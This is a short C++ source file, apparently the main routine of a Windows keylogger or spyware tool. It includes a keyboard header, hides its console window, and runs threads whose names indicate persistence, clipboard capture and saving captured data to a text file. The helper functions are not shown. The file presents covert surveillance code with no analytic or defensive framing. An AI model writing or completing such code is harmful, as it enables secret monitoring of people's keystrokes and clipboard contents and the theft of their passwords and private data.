#include "Utils/keyboard.h"
#include "Utils/functions.h"

int main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	
    std::thread t1;
	std::thread t2;
	std::thread t3;

	t1 = std::thread(PersistantApplication);
	t2 = std::thread(clipboard);
	t3 = std::thread(saveInTextFile);

	t1.join();
	t2.join();
	t3.join();

	return 0;
}
